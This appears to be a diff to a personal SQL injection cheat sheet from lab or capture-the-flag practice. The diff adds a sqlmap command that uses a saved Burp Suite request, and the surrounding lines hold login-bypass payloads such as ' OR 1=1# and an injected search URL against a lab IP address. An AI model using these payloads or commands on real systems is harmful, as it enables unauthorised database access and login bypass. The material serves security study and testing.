@@ -7,7 +7,6 @@ MySQL
 Username: Administrator
 Password: ' OR 1=1#
 
-XXX
 Username: admin' OR 1=1 -- -
 Password: admin' OR 1=1 -- -
 ```
@@ -15,6 +14,9 @@ Password: admin' OR 1=1 -- -
 ## SQLmap
 Below example is a search engine on website for authenticated users:
 ```
+# Use saved request from burp suite (RMB -> Save item)
+sqlmap -r login.req
+
 # URL to search:
 # http://10.129.95.174/dashboard.php?search=ELI%27+OR+1%3D1%23
 
